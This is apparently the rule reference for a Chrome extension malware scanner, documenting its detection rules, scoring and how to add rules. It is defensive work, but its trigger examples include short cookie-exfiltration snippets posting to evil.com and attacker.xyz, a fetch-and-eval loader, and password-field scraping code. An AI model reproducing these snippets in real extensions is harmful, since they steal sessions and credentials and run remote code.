# Detection Rules Reference

Complete documentation for all malware detection rules in the Chrome Extension Analyzer.

## Table of Contents

- [Rule Format](#rule-format)
- [API Rules (Session Theft)](#api-rules-session-theft)
- [Permission Rules](#permission-rules)
- [Anti-Analysis Rules](#anti-analysis-rules)
- [Dynamic Code Rules](#dynamic-code-rules)
- [Network Rules](#network-rules)
- [Manifest Rules](#manifest-rules)
- [Obfuscation Rules](#obfuscation-rules)
- [Performance Rules](#performance-rules)
- [Behavior Patterns](#behavior-patterns)
- [Adding Custom Rules](#adding-custom-rules)
- [Modifying Existing Rules](#modifying-existing-rules)

## Rule Format

Each rule is defined in `supabase/functions/analyze-extension/index.ts` with this structure:

```typescript
"RULE-ID": {
  id: "RULE-ID",              // Unique identifier (e.g., API-1, PERM-2)
  severity: "critical",        // low | medium | high | critical
  confidence: "high",          // low | medium | high
  category: "code_patterns",   // Category for grouping
  title: "Short Title",        // Display name
  description: "Details..."    // What this detects
}
```

### Severity Levels
- **Critical (50 pts)**: Immediate security threat, known malware technique
- **High (30 pts)**: Dangerous behavior, high exploitation risk
- **Medium (15 pts)**: Suspicious pattern, potential misuse
- **Low (5 pts)**: Informational, minor concern

### Confidence Levels
- **High (1.0x)**: Strong indicator, multiple conditions met
- **Medium (0.7x)**: Likely suspicious, single clear indicator
- **Low (0.4x)**: Weak signal, may be legitimate use

### Categories
- `code_patterns` - JavaScript/code analysis
- `permissions` - Manifest permissions
- `anti-analysis` - Evasion techniques
- `network` - External connections
- `manifest` - Manifest configuration
- `obfuscation` - Code complexity
- `behavior` - Combined pattern analysis
- `performance` - Scan metadata

---

## API Rules (Session Theft)

### API-1: Session Cookie Exfiltration

**Severity**: Critical | **Confidence**: High | **Category**: code_patterns

**Description**: Extension reads authentication cookies using `chrome.cookies` API and sends them to a remote server. This is a definitive indicator of session hijacking malware.

**Detection Logic**:
```typescript
// Both conditions must be true:
1. chrome.cookies.getAll() or chrome.cookies.get()
2. fetch() or XMLHttpRequest or .send()
```

**Triggers When**:
```javascript
// Example 1: Direct exfiltration
chrome.cookies.getAll({}, function(cookies) {
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(cookies)
  });
});

// Example 2: Async exfiltration
const cookies = await chrome.cookies.getAll({domain: "bank.com"});
await fetch("https://attacker.xyz/log", {body: cookies});
```

**Does NOT Trigger**:
```javascript
// Only reads cookies (no network call)
chrome.cookies.getAll({}, function(cookies) {
  console.log(cookies);
});

// Network call without cookie access
fetch('https://api.legitimate.com/data');
```

**File Location**: Lines 667-688 in `index.ts`

**Evidence Format**: Shows both the cookie access call and destination URL

---

### API-2: Direct Cookie Access

**Severity**: Medium | **Confidence**: Medium | **Category**: code_patterns

**Description**: Extension accesses `document.cookie` which can be used to scrape session tokens from web pages. While less severe than chrome.cookies API, still concerning.

**Detection Logic**:
```typescript
// Simple regex match:
/document\.cookie/
```

**Triggers When**:
```javascript
// Reading cookies
const cookies = document.cookie;

// Modifying cookies
document.cookie = "session=abc123";

// In content script
chrome.runtime.sendMessage({cookies: document.cookie});
```

**Legitimate Uses**:
- Reading non-sensitive preferences
- Setting display options
- Client-side analytics

**File Location**: Lines 690-703 in `index.ts`

**Evidence Format**: Shows the `document.cookie` access code

---

### API-3: Credential Scraping Behavior

**Severity**: Medium | **Confidence**: Medium | **Category**: code_patterns

**Description**: Extension queries password input fields, potentially capturing user credentials during login.

**Detection Logic**:
```typescript
/querySelector.*password|input\[type=["']password["']\]/
```

**Triggers When**:
```javascript
// Selecting password fields
const pwd = document.querySelector('input[type="password"]');

// Monitoring password input
const passwords = document.querySelectorAll('[type=password]');

// Event listeners on password fields
document.querySelector('.password-field').addEventListener('keyup', ...);
```

**Legitimate Uses**:
- Password manager extensions
- Form auto-fill features
- Accessibility tools

**File Location**: Lines 705-718 in `index.ts`

**Evidence Format**: Shows the querySelector call

---

## Permission Rules

### PERM-1: High-Risk Permission - cookies

**Severity**: High | **Confidence**: Medium | **Category**: permissions

**Description**: Extension requests `cookies` permission, allowing access to authentication tokens from all websites.

**Manifest Example**:
```json
{
  "permissions": ["cookies"]
}
```

**Risk**: Combined with network access, enables session hijacking

**File Location**: Lines 537-585 in `index.ts`

---

### PERM-2: High-Risk Permission - management

**Severity**: High | **Confidence**: High | **Category**: permissions

**Description**: Extension can query or control other installed extensions, often used to detect security tools.

**Manifest Example**:
```json
{
  "permissions": ["management"]
}
```

**Risk**: Anti-analysis technique, can disable security extensions

**File Location**: Lines 537-585 in `index.ts`

---

### PERM-3: High-Risk Permission - debugger

**Severity**: Critical | **Confidence**: High | **Category**: permissions

**Description**: Allows attaching to Chrome DevTools protocol - extremely dangerous permission.

**Manifest Example**:
```json
{
  "permissions": ["debugger"]
}
```

**Risk**: Complete browser control, memory access, code injection

**File Location**: Lines 537-585 in `index.ts`

---

### PERM-4: High-Risk Permission - proxy

**Severity**: Critical | **Confidence**: High | **Category**: permissions

**Description**: Extension can control browser proxy settings, redirecting all traffic.

**Manifest Example**:
```json
{
  "permissions": ["proxy"]
}
```

**Risk**: Man-in-the-middle attacks, traffic interception

**File Location**: Lines 537-585 in `index.ts`

---

### PERM-5: High-Risk Permission - webRequestBlocking

**Severity**: Critical | **Confidence**: High | **Category**: permissions

**Description**: Can intercept and modify ALL web traffic synchronously.

**Manifest Example**:
```json
{
  "permissions": ["webRequest", "webRequestBlocking"]
}
```

**Risk**: Data theft, content injection, HTTPS hijacking

**File Location**: Lines 537-585 in `index.ts`

---

### PERM-6: Broad Host Permissions

**Severity**: High | **Confidence**: High | **Category**: permissions

**Description**: Extension requests access to all websites via wildcard patterns.

**Manifest Examples**:
```json
{
  "host_permissions": ["<all_urls>"],
  // or
  "permissions": ["http://*/*", "https://*/*"]
}
```

**Risk**: Unlimited access to all user data across web

**File Location**: Lines 571-583 in `index.ts`

---

## Anti-Analysis Rules

### ANALYSIS-1: Extension Enumeration Detected

**Severity**: High | **Confidence**: High | **Category**: anti-analysis

**Description**: Uses `chrome.management` API to list installed extensions, typically to detect security tools or analysis environments.

**Detection Logic**:
```typescript
/chrome\.management\.(getAll|get)\s*\(/
```

**Triggers When**:
```javascript
// Listing all extensions
chrome.management.getAll(function(extensions) {
  // Check for security tools
});

// Querying specific extension
chrome.management.get(extensionId, callback);
```

**Malicious Use**: Checking for antivirus, security scanners, or admin tools before activating payload

**File Location**: Lines 720-733 in `index.ts`

---

### ANALYSIS-2: Security Tool Blacklist in Code

**Severity**: High | **Confidence**: High (10+ IDs) / Medium (5-9 IDs) | **Category**: anti-analysis

**Description**: Found hardcoded list of Chrome extension IDs (32 lowercase letters). Malware uses this to detect and avoid security tools.

**Detection Logic**:
```typescript
// Finds all extension IDs (32-char lowercase strings)
/\b[a-z]{32}\b/g

// Triggers if 5+ unique IDs found across all files
```

**Triggers When**:
```javascript
// Blacklist array
const securityTools = [
  'abc...xyz',  // Extension 1
  'def...uvw',  // Extension 2
  'ghi...rst'   // Extension 3
  // ... 5 or more IDs
];

// Checking if tool is installed
if (installedIds.includes('abcd...xyz')) {
  // Don't activate malicious behavior
}
```

**Evidence**: Shows first 5 extension IDs found and total count

**File Location**: Lines 650-663 in `index.ts`

---

### ANALYSIS-3: DevTools Anti-Inspection Script

**Severity**: High | **Confidence**: High | **Category**: anti-analysis

**Description**: Includes code to detect or disable browser developer tools, preventing code inspection.

**Detection Logic**:
```typescript
/disabledevtool|DisableDevtool|disable-devtool/i
```

**Triggers When**:
```javascript
// Using DisableDevTool library
import DisableDevtool from 'disable-devtool';
DisableDevtool();

// Manual detection
if (window.outerHeight - window.innerHeight > 200) {
  // DevTools is open
}
```

**Malicious Use**: Preventing security researchers from analyzing code

**File Location**: Lines 735-748 in `index.ts`

---

## Dynamic Code Rules

### DYN-1: Dynamic Code Execution

**Severity**: High | **Confidence**: High | **Category**: code_patterns

**Description**: Uses `eval()` or `new Function()` to execute code dynamically at runtime.

**Detection Logic**:
```typescript
/eval\s*\(|new\s+Function\s*\(/
```

**Triggers When**:
```javascript
// eval usage
eval(maliciousCode);

// Function constructor
const fn = new Function('a', 'b', 'return a + b');

// Indirect eval
window['eval'](code);
```

**Legitimate Uses**:
- JSON parsing (old code)
- Template engines
- Code playgrounds

**Risk**: Can execute arbitrary attacker-controlled code

**File Location**: Lines 755-783 in `index.ts`

---

### DYN-2: Fetch-and-Eval Remote Code

**Severity**: Critical | **Confidence**: High | **Category**: code_patterns

**Description**: Extension downloads code from remote server AND executes it with eval. Classic malware technique.

**Detection Logic**:
```typescript
// Both conditions required:
1. fetch() OR XMLHttpRequest OR .send()
2. eval() OR new Function()
```

**Triggers When**:
```javascript
// Classic fetch-and-eval
fetch('https://evil.com/payload.js')
  .then(r => r.text())
  .then(code => eval(code));

// With XMLHttpRequest
xhr.onload = function() {
  eval(this.responseText);
};
xhr.send();
```

**Why Critical**: Allows attacker to update malicious payload without republishing extension

**File Location**: Lines 770-782 in `index.ts`

---

## Network Rules

### NET-1: Suspicious External Domain

**Severity**: High | **Confidence**: High | **Category**: network

**Description**: Code references an IP address directly (not a domain name), which may be an unauthorized command-and-control server.

**Detection Logic**:
```typescript
// Extracts all URLs, checks if hostname is IP address
/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/
```

**Triggers When**:
```javascript
// Direct IP connections
fetch('http://192.168.1.100/api');
fetch('http://45.123.67.89:8080/data');

// IP in config
const server = "http://203.0.113.42";
```

**Whitelist**: Check `WHITELISTED_DOMAINS` array to exclude false positives

**Evidence**: Shows the full URL containing the IP

**File Location**: Lines 807-855 in `index.ts`

---

### NET-2: High-Risk TLD Detected

**Severity**: Medium | **Confidence**: Medium | **Category**: network

**Description**: Extension contacts domain with suspicious top-level domain commonly used by malware.

**Suspicious TLDs**:
```typescript
['.xyz', '.top', '.tk', '.ml', '.ga', '.cf', '.gq', '.pw', '.cc']
```

**Triggers When**:
```javascript
fetch('https://evil-server.xyz/api');
fetch('https://c2-server.top/collect');
xhr.open('GET', 'http://malware.tk/payload');
```

**Why Suspicious**: These TLDs are often free or very cheap, favored by malware operators for disposable infrastructure

**Whitelist**: Legitimate uses exist, check context

**File Location**: Lines 807-855 in `index.ts`

---

## Manifest Rules

### MAN-1: Insecure Content Security Policy

**Severity**: High | **Confidence**: High | **Category**: manifest

**Description**: Manifest allows unsafe script execution via `unsafe-eval` or loads remote scripts, weakening security.

**Detection Logic** (Manifest v2):
```typescript
// Checks if CSP contains:
- 'unsafe-eval'
- http:// or https:// URLs
```

**Triggers When**:
```json
{
  "manifest_version": 2,
  "content_security_policy": "script-src 'self' 'unsafe-eval' https://cdn.example.com"
}
```

**Risk**: Allows eval() usage and loading untrusted scripts

**File Location**: Lines 867-884 in `index.ts`

---

### MAN-2: Broad Externally Connectable

**Severity**: Medium | **Confidence**: Medium | **Category**: manifest

**Description**: Extension allows broad external websites to send messages via `externally_connectable`.

**Detection Logic**:
```typescript
// Checks externally_connectable.matches for:
- Wildcards (*)
- <all_urls>
- ://*/* patterns
```

**Triggers When**:
```json
{
  "externally_connectable": {
    "matches": [
      "https://*/*",
      "*://example.com/*"
    ]
  }
}
```

**Risk**: Any matching website can send messages to extension, potential command injection

**File Location**: Lines 886-905 in `index.ts`

---

## Obfuscation Rules

### OBF-1: Heavily Obfuscated Code

**Severity**: Medium | **Confidence**: Medium | **Category**: obfuscation

**Description**: JavaScript files appear heavily minified/obfuscated based on entropy, line length, and density metrics.

**Detection Heuristics**:
1. **Average line length** > 500 characters (+30 pts)
2. **Code density**: >10KB in <50 lines (+25 pts)
3. **Entropy** > 4.5 bits per character (+20 pts)
4. **Minification markers**: `function(a,b,c)` patterns (+15 pts)
5. **Low whitespace ratio** < 10% (+10 pts)

**Obfuscation Score**: 0-100 (triggers finding if avg file score > 50)

**Examples**:
```javascript
// High entropy, long lines
eval(function(p,a,c,k,e,d){while(c--)if(k[c])p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c]);return p}('7 0=1 2(3,4,5,6)...
```

**Legitimate Uses**:
- Production build minification
- Webpack/Rollup bundles
- Third-party libraries

**File Location**: Lines 989-1044 in `index.ts`

**Risk Calculation**: Obfuscation adds `score * 0.3` to final risk score

---

## Performance Rules

### PERF-1: Files Skipped During Scan

**Severity**: Low | **Confidence**: High | **Category**: performance

**Description**: Some files were too large or timed out during analysis. Results may be incomplete.

**Triggers When**:
- File size > 500KB (MAX_INDIVIDUAL_FILE_SIZE)
- File parsing throws exception

**Evidence**: Lists skipped files and reasons

**Impact**: Missing malicious code in skipped files

**Solution**: Increase `MAX_INDIVIDUAL_FILE_SIZE` if needed

**File Location**: Lines 349-360 in `index.ts`

---

## Behavior Patterns

Behavior patterns combine multiple indicators to detect high-level threats.

### Session Theft Candidate

**Severity**: Critical | **Conditions**:
1. Has `cookies` permission
2. Has `<all_urls>` or broad host permissions
3. Contains external URLs (network capability)

**Malicious Intent**: Can steal cookies from any website and exfiltrate

**File Location**: Lines 929-945 in `index.ts`

---

### Keylogger Candidate

**Severity**: Critical | **Conditions**:
1. Code monitors keyboard events (`keydown`, `keypress`)
2. Contains external URLs (network capability)

**Malicious Intent**: Can capture keystrokes and send to remote server

**File Location**: Lines 948-965 in `index.ts`

---

### Proxy Hijack Candidate

**Severity**: Critical | **Conditions**:
1. Has `proxy` permission
2. Has `<all_urls>` or broad host permissions

**Malicious Intent**: Can redirect all browser traffic through attacker's server

**File Location**: Lines 967-984 in `index.ts`

---

## Adding Custom Rules

### Step 1: Define the Rule

Add to `RULE_DEFINITIONS` object in `index.ts` (lines 59-220):

```typescript
"CUSTOM-1": {
  id: "CUSTOM-1",
  severity: "high",
  confidence: "high",
  category: "code_patterns",
  title: "My Custom Detection",
  description: "Detects suspicious behavior X"
}
```

### Step 2: Implement Detection Logic

Choose the appropriate function based on what you're detecting:

**For JavaScript patterns** → `analyzeJavaScript()` (lines 666-786):
```typescript
if (/suspiciousPattern/.test(code)) {
  const rule = RULE_DEFINITIONS["CUSTOM-1"];
  findings.push({
    rule_id: "CUSTOM-1",
    category: rule.category,
    severity: rule.severity,
    confidence: rule.confidence,
    title: rule.title,
    description: rule.description,
    evidence: code.match(/suspiciousPattern/)[0],
    file_path: filename,
  });
}
```

**For permissions** → `analyzePermissions()` (lines 537-585)
**For manifest** → `analyzeManifestDeep()` (lines 867-906)
**For URLs/domains** → `extractIOCsFromText()` (lines 807-855)

### Step 3: Deploy

Save the file and the edge function automatically redeploys.

### Step 4: Update Frontend (Optional)

If using a new category, add colors in `AnalysisResults.tsx`:

```typescript
case 'my_new_category':
  return 'bg-purple-100 text-purple-800';
```

---

## Modifying Existing Rules

### Changing Severity

Edit the `RULE_DEFINITIONS` object:

```typescript
"API-2": {
  severity: "high",  // Changed from "medium"
  // ... rest unchanged
}
```

**Impact**: Increases/decreases risk score contribution

### Changing Confidence

```typescript
"NET-2": {
  confidence: "low",  // Changed from "medium"
  // ... rest unchanged
}
```

**Impact**: Applies confidence multiplier to severity score

### Adjusting Detection Logic

Find the detection code and modify the regex or conditions:

```typescript
// Before (lines 690-703)
if (/document\.cookie/.test(code)) {
  // triggers finding
}

// After - more specific
if (/document\.cookie\s*=|sendCookies\(document\.cookie\)/.test(code)) {
  // only triggers on write or suspicious send
}
```

### Multi-Condition Rules

For rules that require multiple conditions (like API-1):

```typescript
const condition1 = /pattern1/.test(code);
const condition2 = /pattern2/.test(code);
const condition3 = /pattern3/.test(code);

if (condition1 && condition2 && condition3) {
  // All conditions met
  findings.push({...});
}
```

---

## Testing Rules

### Manual Testing

1. Analyze a known-malicious extension
2. Check if rule triggers correctly
3. Review evidence field for accuracy
4. Verify severity and confidence are appropriate

### False Positive Testing

1. Analyze popular legitimate extensions
2. If rule triggers, evaluate if it's a false positive
3. Adjust confidence level or add conditions to reduce FPs

### Rule Analytics

Query database to see how often rules trigger:

```sql
SELECT
  rule_id,
  COUNT(*) as trigger_count,
  AVG(CASE severity
    WHEN 'critical' THEN 50
    WHEN 'high' THEN 30
    WHEN 'medium' THEN 15
    WHEN 'low' THEN 5
  END) as avg_severity_score
FROM security_findings
WHERE rule_id IS NOT NULL
GROUP BY rule_id
ORDER BY trigger_count DESC;
```

---

## Rule Precedence

Rules don't override each other - all matching rules create separate findings.

**Example**: An extension that uses `eval()` AND has `cookies` permission will trigger:
- DYN-1 (eval usage)
- PERM-1 (cookies permission)
- Potentially API-1 if cookies + network call in same file

**Risk Score**: Sum of all findings (confidence-weighted)

---

## Best Practices

### Writing Detection Rules

1. **Be specific**: Narrow patterns reduce false positives
2. **Multi-condition**: Require 2+ suspicious behaviors for high confidence
3. **Context matters**: Check surrounding code, not just regex match
4. **Test thoroughly**: Validate against known malware and legitimate extensions
5. **Document well**: Clear description helps users understand findings

### Rule Naming

- Use category prefix: `API-`, `PERM-`, `NET-`, etc.
- Number sequentially: `API-1`, `API-2`, `API-3`
- Keep IDs short: Max 12 characters
- Be consistent: All related rules use same prefix

### Confidence Levels

Use this guidance:
- **High**: Multiple conditions, well-known malware technique, strong evidence
- **Medium**: Single clear indicator, suspicious but possibly legitimate
- **Low**: Weak signal, needs context, high FP risk

### Evidence Quality

Provide useful evidence in findings:
- Code snippets (20-200 chars)
- URLs or domain names
- Permission names
- Pattern matches

**Good**: `"chrome.cookies.getAll() → fetch('https://evil.com/steal')"`
**Bad**: `"Suspicious code detected"`

---

## Rule Maintenance

### Updating for New Malware

Monitor security research for new Chrome extension malware techniques:

1. Identify the malicious pattern
2. Create a rule to detect it
3. Set appropriate severity and confidence
4. Test against samples
5. Deploy and monitor

### Deprecating Rules

If a rule produces too many false positives:

1. Lower confidence level first
2. Add additional conditions to narrow scope
3. As last resort, comment out detection code
4. Keep rule definition for historical data

### Version Control

Track rule changes in git commits:
- Note rule ID in commit message
- Explain why rule was added/modified
- Link to malware samples or research if available

---

## Reference

### File Locations

All detection logic is in: `supabase/functions/analyze-extension/index.ts`

- **Lines 59-220**: Rule definitions
- **Lines 537-585**: Permission analysis (PERM-*)
- **Lines 666-786**: JavaScript analysis (API-*, DYN-*, ANALYSIS-*)
- **Lines 807-855**: Network analysis (NET-*)
- **Lines 867-906**: Manifest analysis (MAN-*)
- **Lines 908-987**: Behavior pattern detection
- **Lines 989-1044**: Obfuscation scoring (OBF-*)

### Configuration Constants

```typescript
MAX_FILE_SIZE = 50 MB              // Total extension size limit
MAX_INDIVIDUAL_FILE_SIZE = 500 KB  // Per-file analysis limit
WHITELISTED_DOMAINS = [...]        // Trusted domains
SUSPICIOUS_TLDS = [...]            // High-risk TLDs
```

### Risk Scoring Formula

```
Final Score = Σ(severity × confidence) + (obfuscation × 0.3)
Risk Level = critical (≥80) | high (≥60) | medium (≥30) | low (<30)
```

---

For system architecture details, see [ARCHITECTURE.md](ARCHITECTURE.md).
For configuration options, see [CONFIGURATION.md](CONFIGURATION.md).
